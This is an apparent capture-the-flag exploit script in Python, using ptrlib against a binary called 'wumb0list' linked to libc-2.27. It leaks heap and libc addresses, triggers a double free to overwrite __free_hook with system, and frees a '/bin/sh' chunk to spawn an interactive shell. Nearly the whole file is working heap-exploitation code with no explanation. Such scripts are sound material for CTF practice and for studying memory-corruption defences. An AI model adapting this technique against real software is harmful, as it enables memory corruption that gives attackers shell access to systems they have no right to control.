from ptrlib import *

def enter_list():
    sock.sendlineafter("wisely: ", "2")
    return
def leave_list():
    sock.sendlineafter("wisely: ", "8")
    return
def new(name):
    sock.sendlineafter("wisely: ", "1")
    sock.sendlineafter("name: ", name)
    return
def delete(index):
    sock.sendlineafter("wisely: ", "2")
    sock.sendlineafter("number: ", str(index))
    return
def add(index, id):
    sock.sendlineafter("wisely: ", "5")
    sock.sendlineafter("number: ", str(index))
    sock.sendlineafter("ID: ", str(id))
    return
def show(index):
    sock.sendlineafter("wisely: ", "4")
    sock.sendlineafter("number: ", str(index))
    sock.recvuntil("List ")
    name = sock.recvline()
    sock.recvline()
    item = int(sock.recvuntil(":")[:-1])
    sock.recvline()
    data = sock.recvline()
    return name, item, data

def enter_catalog():
    sock.sendlineafter("wisely: ", "1")
    return
def leave_catalog():
    sock.sendlineafter("wisely: ", "5")
    return
def c_new(id, name):
    sock.sendlineafter("wisely: ", "1")
    sock.sendlineafter(": ", str(id))
    sock.sendlineafter(": ", name)
    return
def c_delete(id):
    sock.sendlineafter("wisely: ", "2")
    sock.sendlineafter(": ", str(id))
    return
"""
def show():
    sock.sendlineafter("wisely: ", "3")
    sock.recvline()
    itemList = {}
    while True:
        line = sock.recvline()
        if line == b'': break
        ofs = line.index(b':')
        itemList[int(line[:ofs])] = line[ofs + 2:]
    return itemList
def import_file(path):
    sock.sendlineafter("wisely: ", "4")
    sock.sendlineafter(": ", path)
    return
"""

elf = ELF("./wumb0list")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process(["stdbuf", "-i0", "-o0", "./wumb0list"])

# prepare heap
enter_catalog()
c_new(1, "AAAAAAAA")
leave_catalog()

# libc leak
enter_list()
new(p64(0x603100) + p64(0x6030d8))
name, item, data = show(10)
heap_base = u64(name) - 0x260
libc_base = item - libc.symbol("_IO_2_1_stdout_") - 0x83
logger.info("heap = " + hex(heap_base))
logger.info("libc = " + hex(libc_base))

#new(p64(libc_base + libc.symbol('__free_hook')) + p64(0))
#new(p64(heap_base + 0x290) + p64(0))
#new(p64(heap_base + 0x2d0) + p64(0))
#new(p64(heap_base + 0x2d0) + p64(heap_base + 0x2f0))
new(p64(heap_base + 0x290) + p64(0))
delete(10)
leave_list()

# double free
enter_catalog()
c_delete(1)
c_new(1, p64(libc_base + libc.symbol('__free_hook')))
c_new(2, "/bin/sh\x00")
c_new(3, p64(libc_base + libc.symbol('system')))

# get the shell
c_delete(2)

sock.interactive()
